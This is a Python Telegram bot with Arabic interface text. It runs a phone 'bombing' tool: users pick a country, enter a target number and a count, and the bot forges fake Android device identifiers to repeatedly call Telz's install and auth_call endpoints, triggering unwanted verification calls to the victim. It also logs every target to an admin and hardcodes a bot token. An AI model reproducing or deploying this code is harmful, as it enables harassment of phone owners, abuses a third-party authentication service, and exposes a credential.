# -*- coding: utf-8 -*-

import asyncio
import uuid
import random
import string
import time
import os
from threading import Thread
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
import httpx
from flask import Flask

# ============================================================
# إعدادات سيرفر الويب الوهمي (Flask) لإرضاء منصة Render
# ============================================================
web_app = Flask('')

@web_app.route('/')
def home():
    return "Bot is active and running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    web_app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# ============================================================
# إعدادات البوت والثوابت الأساسية
# ============================================================
BOT_TOKEN = "8948190255:AAEmIHywntwQSU70wWdkXE1s86TbFW3qWx4"
ADMIN_ID = 5960818342

# حالة النظام (لتحكم الأدمن في الإيقاف والتشغيل)
system_status = {
    "is_active": True
}

# تخزين مؤقت لجلسات المستخدمين
user_sessions = {}

# تتبع المستخدمين الجدد والتقارير اليومية للأهداف والأرقام
known_users = set()
user_daily_targets = {}  # {user_id: {"count": 0, "numbers": [...]}}

COUNTRIES = {
    "1": {"name": "العراق", "code": "+964"},
    "2": {"name": "سوريا", "code": "+963"},
    "3": {"name": "مصر", "code": "+20"},
    "4": {"name": "السعودية", "code": "+966"},
}

# ============================================================
# الوظائف البرمجية للعمليات
# ============================================================
def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def make_progress_bar(completed, total, length=10):
    if total <= 0:
        percent = 1.0
        filled_len = length
    else:
        percent = float(completed) / float(total)
        filled_len = int(round(length * percent))
    bar = '█' * filled_len + '-' * (length - filled_len)
    return f"[{bar}] {int(percent * 100)}%"

async def track_new_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in known_users:
        known_users.add(user.id)
        # إرسال إشعار دخول مستخدم جديد للأدمن
        try:
            notification = (
                f"🚨 **إشعار دخول مستخدم جديد!**\n\n"
                f"👤 الاسم: {user.full_name}\n"
                f"🆔 المعرف: @{user.username or 'لا يوجد'}\n"
                f"🔑 الأيدي: <code>{user.id}</code>"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=notification, parse_mode="HTML")
        except Exception:
            pass

# ============================================================
# دوال الواجهات والأزرار التفاعلية
# ============================================================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await track_new_user(update, context)
    user_id = update.effective_user.id
    
    # تنظيف أي جلسة سابقة عند البدء من جديد
    user_sessions.pop(user_id, None)

    keyboard = [
        [InlineKeyboardButton("🇮🇶 العراق (+964)", callback_data="country_1"),
         InlineKeyboardButton("🇸🇾 سوريا (+963)", callback_data="country_2")],
        [InlineKeyboardButton("🇪🇬 مصر (+20)", callback_data="country_3"),
         InlineKeyboardButton("🇸🇦 السعودية (+966)", callback_data="country_4")]
    ]
    
    if user_id == ADMIN_ID:
        status_text = "🟢 البوت يعمل حالياً" if system_status["is_active"] else "🔴 البوت متوقف حالياً"
        keyboard.append([InlineKeyboardButton(f"حالة البوت: {status_text}", callback_data="do_nothing")])
        keyboard.append([
            InlineKeyboardButton("🛑 إيقاف البوت", callback_data="admin_stop"),
            InlineKeyboardButton("تشغيل البوت 🟢", callback_data="admin_start")
        ])

    reply_markup = InlineKeyboardMarkup(keyboard)
    welcome_text = (
        "💀 **مرحباً بك في لوحة تحكم الأداة الذكية**\n\n"
        "القوة الحقيقية تكمن في الصمت قبل العاصفة 🔥\n"
        "يرجى اختيار الدولة المستهدفة للبدء:"
    )
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.edit_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("admin_"):
        if user_id != ADMIN_ID:
            await query.answer("عذراً، هذا الزر مخصص للأدمن فقط ⚠️", show_alert=True)
            return
        
        if data == "admin_stop":
            system_status["is_active"] = False
            await query.answer("تم إيقاف النظام بنجاح 🛑", show_alert=True)
        elif data == "admin_start":
            system_status["is_active"] = True
            await query.answer("تم تشغيل النظام بنجاح 🟢", show_alert=True)
            
        await start_command(update, context)
        return

    if not system_status["is_active"] and user_id != ADMIN_ID:
        await query.answer("⚠️ النظام متوقف مؤقتاً بأمر من الإدارة.", show_alert=True)
        return

    # أزرار التنقل والرجوع
    if data == "back_to_start":
        await start_command(update, context)
        return

    if data == "back_to_country":
        if user_id in user_sessions:
            user_sessions[user_id]["step"] = "waiting_for_number"
        await start_command(update, context)
        return

    # تأكيد أو رفض العملية النهائية
    if data == "confirm_run":
        if user_id not in user_sessions or user_sessions[user_id].get("step") != "confirming":
            await query.message.edit_text("⚠️ انتهت صلاحية هذه الجلسة، ابدأ من جديد عبر /start")
            return
        
        session = user_sessions[user_id]
        session["step"] = "running"
        country_code = session["country_code"]
        target_number = session["number"]
        count = session["count"]
        
        # تسجيل الأهداف والتقرير اليومي للمستخدم
        if user_id not in user_daily_targets:
            user_daily_targets[user_id] = {"count": 0, "numbers": []}
        user_daily_targets[user_id]["count"] += 1
        full_target_str = f"{country_code}{target_number} (العدد: {count})"
        if full_target_str not in user_daily_targets[user_id]["numbers"]:
            user_daily_targets[user_id]["numbers"].append(full_target_str)

        # إرسال تقرير الأهداف الفوري للأدمن
        try:
            user_info = update.effective_user
            report_note = (
                f"📊 **تقرير استهداف جديد:**\n"
                f"👤 المستخدم: {user_info.full_name} (<code>{user_id}</code>)\n"
                f"🎯 الرقم المستهدف: <code>{country_code}{target_number}</code>\n"
                f"🔢 عدد المحاولات المطلوبة: {count}\n"
                f"📈 إجمالي عمليات المستخدم اليومية: {user_daily_targets[user_id]['count']}"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=report_note, parse_mode="HTML")
        except Exception:
            pass

        user_sessions.pop(user_id, None)

        status_msg = await query.message.edit_text(
            f"🚀 تم بدء التنفيذ الفوري في الخلفية للرقم: <code>{country_code}{target_number}</code>\n"
            "تابع العداد المتحرك أدناه:", 
            parse_mode="HTML"
        )

        async def background_task():
            success_count = 0
            fail_count = 0
            install_url = "https://api.telz.com/app/install"
            auth_call_url = "https://api.telz.com/app/auth_call"
            headers = {
                'User-Agent': "Telz-Android/17.5.17",
                'Content-Type': "application/json"
            }

            async with httpx.AsyncClient(timeout=10.0) as client:
                for i in range(1, count + 1):
                    if not system_status["is_active"] and user_id != ADMIN_ID:
                        break

                    foxx, fox, foxer = generate_unique_ids()
                    payload_install = {
                        "android_id": fox, "app_version": "17.5.17", "event": "install",
                        "google_exists": "yes", "os": "android", "os_version": "9",
                        "play_market": True, "ts": foxx, "uuid": str(foxer)
                    }
                    payload_auth_call = {
                        "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                        "event": "auth_call", "lang": "ar", "os": "android", "os_version": "9",
                        "phone": f"{country_code}{target_number}", "ts": foxx, "uuid": str(foxer)
                    }

                    try:
                        res_install = await client.post(install_url, json=payload_install, headers=headers)
                        if res_install.status_code == 200 and "ok" in res_install.text:
                            res_call = await client.post(auth_call_url, json=payload_auth_call, headers=headers)
                            if res_call.status_code == 200 and "ok" in res_call.text:
                                success_count += 1
                            else:
                                fail_count += 1
                        else:
                            fail_count += 1
                    except Exception:
                        fail_count += 1

                    progress_bar = make_progress_bar(i, count)
                    progress_text = (
                        f"⚡ **حالة التنفيذ للرقم ({target_number}):**\n"
                        f"{progress_bar}\n\n"
                        f"✅ الناجح: <b>{success_count}</b>\n"
                        f"❌ الفاشل: <b>{fail_count}</b>\n"
                        f"📊 المحاولة: ({i}/{count})"
                    )
                    
                    try:
                        await status_msg.edit_text(progress_text, parse_mode="HTML")
                    except Exception:
                        pass

                    await asyncio.sleep(2)  # سرعة فائقة مستقرة

            await status_msg.reply_text(f"🏁 انتهت المهمة للرقم <code>{country_code}{target_number}</code> بنجاح.", parse_mode="HTML")

        asyncio.create_task(background_task())
        return

    if data == "cancel_run":
        user_sessions.pop(user_id, None)
        await query.message.edit_text("❌ تم إلغاء العملية بنجاح. اضغط /start للبدء من جديد.")
        return

    # اختيار الدولة
    if data.startswith("country_"):
        c_key = data.split("_")[1]
        country_info = COUNTRIES.get(c_key)
        
        user_sessions[user_id] = {"country_code": country_info["code"], "country_name": country_info["name"]}
        
        back_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع لاختيار الدولة", callback_data="back_to_start")]])
        
        await query.message.edit_text(
            f"الدولة المختارة: <b>{country_info['name']} ({country_info['code']})</b>\n\n"
            "الرجاء إرسال الرقم المحلي الآن (مثال: <code>501234567</code> بدون مفتاح الدولة):",
            reply_markup=back_keyboard,
            parse_mode="HTML"
        )
        user_sessions[user_id]["step"] = "waiting_for_number"

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if not system_status["is_active"] and user_id != ADMIN_ID:
        return

    if user_id not in user_sessions:
        await update.message.reply_text("يرجى استخدام الأمر /start أولاً لبدء الجلسة.")
        return

    session = user_sessions[user_id]
    step = session.get("step")

    if step == "waiting_for_number":
        clean_num = text.lstrip("+")
        session["number"] = clean_num
        session["step"] = "waiting_for_count"
        
        back_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع لتعديل الرقم", callback_data="back_to_country")]])
        
        await update.message.reply_text(
            f"✅ تم حفظ الرقم: <code>{session['country_code']}{clean_num}</code>\n\n"
            "الآن، أدخل عدد المرات (الطلبات) التي ترغب في إرسالها (مثال: <code>10</code>):",
            reply_markup=back_keyboard,
            parse_mode="HTML"
        )

    elif step == "waiting_for_count":
        try:
            count = int(text)
            if count <= 0 or count > 100:
                await update.message.reply_text("⚠️ يرجى إدخال رقم صحيح بين 1 و 100 لضمان الاستقرار.")
                return
        except ValueError:
            await update.message.reply_text("⚠️ يرجى إدخال رقم صحيح فقط.")
            return

        session["count"] = count
        session["step"] = "confirming"
        
        country_code = session["country_code"]
        target_number = session["number"]

        # خيار تأكيد أو رفض العملية النهائية قبل الإرسال
        confirm_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ تأكيد البدء 🚀", callback_data="confirm_run")],
            [InlineKeyboardButton("❌ رفض / إلغاء", callback_data="cancel_run")],
            [InlineKeyboardButton("⬅️ رجوع لتعديل العدد", callback_data="back_to_country")]
        ])

        await update.message.reply_text(
            f"📋 **ملخص تفاصيل العملية:**\n\n"
            f"🎯 الهدف: <code>{country_code}{target_number}</code>\n"
            f"🔢 عدد الطلبات: <b>{count}</b>\n\n"
            f"هل تريد التأكيد والمتابعة؟",
            reply_markup=confirm_keyboard,
            parse_mode="HTML"
        )

# ============================================================
# التشغيل الرئيسي
# ============================================================
def main():
    # تشغيل سيرفر الويب في خلفية منفصلة لإرضاء Render
    keep_alive()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("[*] Telegram Bot with Flask Web Server is running successfully...")
    app.run_polling()

if __name__ == "__main__":
    main()
